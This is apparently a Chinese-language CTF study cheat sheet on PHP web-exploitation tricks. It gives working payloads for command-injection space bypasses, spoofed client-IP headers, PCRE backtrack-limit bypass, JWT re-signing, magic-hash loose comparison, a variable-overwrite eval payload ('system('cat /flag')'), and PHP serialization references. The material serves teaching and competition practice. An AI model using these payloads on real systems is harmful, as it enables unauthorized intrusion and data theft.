## ⑦ URL 特殊字符（**通用坑**）

| 字符 | 编码 | 说明 |
|---|---|---|
| **`+`** | **`%2B`** | **query 里 `+` = 空格**（base64 必须编码） |
| `&` | `%26` | 参数分隔 |
| `#` | `%23` | 锚点（会被截断） |
| 空格 | `%20` |  |
| `"` | `%22` |  |
| `{` `}` | `%7B` `%7D` |  |
| `'` | `%27` |  |

**最稳**：整体用 `urlencode()` / `EscapeDataString()`。

**只能编一次**：`$_GET` / `$_POST` / `$_COOKIE` 都会**自动 `urldecode` 一次**。

| 你发 | PHP 解一次后 | 结果 |
|---|---|---|
| `%2E` | `.` | 成功 |
| `%252E` | `%2E` | **还是编码态** |

> **你编一次、PHP 解一次，刚好抵消；编两次就多出一层。**（`$_SERVER` 里的值不额外解码）

## ⑨ 空格绕过（命令注入 / WAF）

| 场景 | `/**/` 能不能当空格 |
|---|---|
| PHP / MySQL / JS **代码层** | **可以**（`1/**/+/**/2 = 3`、`strlen/**/("x")`） |
| **字符串 / 引号内部** | 只是普通字符（`"sys/**/nb"` 长度 9） |
| **shell 命令行** | 完全无效（`cat/**/flag.txt` 报 No such file） |

**shell 通用空格替代品**：`${IFS}` / `$IFS`、`%09`（或 `$'\t'`）、`cat<flag.txt`、`{cat,flag.txt}`、`cat /flag*`、`a=$' '; cat${a}flag.txt`、`c''at` / `c\at`。

**WAF 双解析绕过**：过滤正则漏 `/s` 时，`sys/*换行*/nb` 删不掉（`.` 不匹配换行），但 PHP 当它是注释 → 等价 `sys nb`。→ 详见 [12](./12-注释当空格与命令绕过.md)

## ⑩ 代理 IP 头（伪造本地访问）

```
X-Forwarded-For: 127.0.0.1    ← 历史记录（列表，最左 = 真实客户端）
X-Real-IP: 127.0.0.1          ← 快照（单个，最后一跳）
```

**两个客户端都能伪造，绝不能裸信**（要可信代理白名单 + 边缘覆盖）。

**CTF 全枚举**：`X-Forwarded-For` / `X-Real-IP` / `Client-IP` / `X-Client-IP` / `Remote-Addr` / `X-Remote-Addr` / `X-Originating-IP` / `Forwarded` / `True-Client-IP`。
**实测**：geekchallenge2024 **只认 `X-Real-IP`**，写 XFF 被拒（`nonono,you're not from local ip`）。全试无效 → 校验的是 TCP 层 `REMOTE_ADDR`，只能靠 SSRF。→ 详见 [13](./13-代理IP头XFF与X-Real-IP.md)

## ⑪ PCRE 回溯上限绕过 `preg_match`

**`preg_match()` 是「三态」返回值**：`1` 匹配 / `0` 不匹配 / **`false` 出错**。而 `!false === true` → 直接过掉 `!preg_match(...)` 这层校验。

```
目标:  if (!preg_match('/sys.*nb/is', $x)) { if (strpos($x,'sys nb')!==false) { flag } }
矛盾:  值里要含 "sys nb"，但正则里的 . 能匹配空格 → 必然匹配 → 拿不到 flag
出路:  别想着"让正则不匹配"，要想"让正则出错"
```

```
payload = "sys nb" + "a" × 1000000      # 共 1000006 字节
```

**填充位置决定成败**（`pcre.backtrack_limit` 默认 1000000）：

| 写法 | 结果 |
|---|---|
| `"sys" + "a"×1e6 + " nb"` | 贪婪 `.*` 吞完 `a` 串**立刻**找到 `nb` → 几乎不回退 |
| **`"sys nb" + "a"×1e6`** | `.*` 必须从百万个 `a` 的末尾**一路回退** → 撑爆上限 |

> 触发条件不是「字符串够长」，而是「**必须回退足够多次**」。

## ⑫ base64 分段与重签（JWT）

**只要重新签名，长度随便变，不用管对齐。**
只有**手工在 base64 串里原地改字符**时，才需要关心长度对不对得齐。

| 做法（`false`→`true`，144→143 字节） | 结果（PHP 实测） |
|---|---|
| 原地替换 `ZmFsc2V9` → `dHJ1ZX0`（192→191 字符） | 能过（改动在**末尾**，不影响前面的分组） |
| 解码 → 改字节 → 重编码（不补空格） | 能过 |
| 解码 → 改字节 → 补空格等长 | 能过 |
| **改中间字段 + 长度变了** | **会错位** |
| **重新签名** | **长度无关** |

**正确做法**（永远只用这条）：

```python
raw = b64url_decode(payload_b64)        # ① 解码成字节
raw = raw.replace(b"false", b"true", 1) # ② 在字节层面改
p   = b64url_encode(raw)                # ③ 重新编码
tok = f"{h}.{p}.{hs256_sign(h, p, key)}"# ④ 重签 ← 长度从此与你无关
```

> **同源现象**：10-03「seek flag」的「丢点」（两个 `.` 消失）本质也是**结构少一位 → 分段错位**。
> **通用习惯**：**别在 base64 串里原地改字符** —— 先解码成字节再改；只要重签，长度随便变。→ 详见 [14](./14-JWT伪造.md)

## ⑬ 魔术哈希速查（**一边是固定串**时用）

```php
sha1((string)$_POST["x"]) == md5("某个常量")      // 右边算出来是 0e 形
```

```
md5("Geekchallenge2024_bmKtL") = 0e073277003087724660601042042394   ← 0e 开头 + 全数字
```

松散比较下两个 `0e...` 都被当数字 `0` → `0 == 0` 成立。**只需让左边也是 `0e` 形**：

| SHA1 魔术哈希 | sha1 值 |
|---|---|
| `aaroZmOk` | `0e66507019969427134894567494305185566735` |
| `aaK1STfY` | `0e76658526655756207688271159624026011393` |
| `aaO8zKZF` | `0e89257456677279068558073954252716165668` |
| `aa3OFF9m` | `0e36977786278517984959260394024281014729` |

| MD5 魔术哈希 | md5 值 |
|---|---|
| `240610708` | `0e462097431906509019562988736854` |
| `QNKCDZO` | `0e830400451993494058024219903391` |
| `aabg7XSs` | `0e087386482136013740957780965295` |

**`sha1` 和 `md5` 的魔术哈希是两个不同的集合** —— 必须看源码用的哪个函数。
判断标准：全串匹配 `^0e\d+$`。

**顺带**：`is_numeric(intval($x))` 是**恒真**（`intval` 返回 int，`is_numeric(int)` 永远为真），不是关卡。
→ 详见 [03 §2.2.1](./03-PHP弱类型绕过.md)

## ⑭ 变量覆盖 `$$key` + `eval($GLOBALS[...])`

```php
foreach ($_GET as $key => $value) {
    $$key = $value;                     // 把每个 GET 参数注册成同名变量
}
...
eval($GLOBALS['code']);                 // 于是 ?code=... 就被执行了
```

**利用**：`?code=system('cat /flag');` → 建立 `$code` → 被 `eval` 执行。

**几个配套要点**：

| 要点 | 说明 |
|---|---|
| `$$key` 只遍历 `$_GET` | → 要覆盖的变量**必须放 URL**，放 POST body 无效 |
| `$_GET` 与 `$_POST` **不合并** | `start` 放 body、`year`/`code` 放 URL，两类要**同一次请求**带齐 |
| `$GLOBALS['code']` | 全局作用域找 `code` 这个名字，GET 参数能被 PHP 注册进去 |

## ⑮ 正则 vs `stripos` 的不对称（绕过「看似矛盾」的判断）

```php
if (preg_match("/.+?rce/ism", $purpose))  die("nonono");      // 不能匹配
if (stripos($purpose, "rce") === false)   die("nonononono");  // 必须含 rce
```

**关键**：`/.+?rce/` 里的 `.+?` **要求 `rce` 前面至少 1 个字符**；而 `stripos` 只找子串，不要求位置。

| purpose | 正则 | stripos | 结果 |
|---|---|---|---|
| **`rce`** | 不匹配 | 位置 0 找到 | **两关都过** |
| `rceX` / `RCE` | 不匹配 | 找到 | 过（后缀/大小写都随便） |
| ` rce` / `xrce` | **匹配** | 找到 | `nonono` |
| `r c e`（拆开） | 不匹配 | **找不到** | `nonononono` |

**口诀**：`rce` 必须在**最开头**、且必须**连续三个字符**。

> **通用思路**：遇到「条件看着矛盾」的题，先别找绕过技巧 —— 先问
> **「这两个判断的判定标准到底哪里不一样？」**
> 四层都是这么破的：嵌套 if 短路 / `sha1` vs `md5` 的类型比较 / `intval` 对科学计数法的两次转换 / 正则 vs 子串查找。

# 四、序列化格式速查

| 记号 | 含义 |
|---|---|
| `O:长度:"类名":属性数:{...}` | 对象 |
| `s:长度:"字符串"` | 字符串 |
| **`S:长度:"...\00..."`** | 字符串（**可转义**） |
| `i:123` | 整数 |
| `b:1` | 布尔 |
| `N` | null |
| `a:个数:{...}` | 数组 |
| **`R:n`** | **引用（值）** |
| `r:n` | 引用（对象） |

**`R:n` 编号怎么数**：**容器 = #1**，之后**每个「值」占一号**（属性名 / 数组键**不占**）。

```
2 属性对象：p2 引用 p1  →  R:2
3 属性对象：p3 引用 p2  →  R:3     ← 不是 R:4
2 元素数组：arr[1] ← arr[0]  →  R:2
```

> **写大了 → `unserialize()` 直接失败（页面空白）**；写小了 → 不报错但**引用不上**（变成独立副本）。
> 最稳的办法：本地 `$o->p3 = &$o->p2; echo serialize($o);` 让 PHP 自己算 → 详见 [07 §引用编号规则](./07-PHP反序列化.md)

**可见性**：
```
public      →  名字
protected   →  \0*\0名字
private     →  \0类名\0名字
```
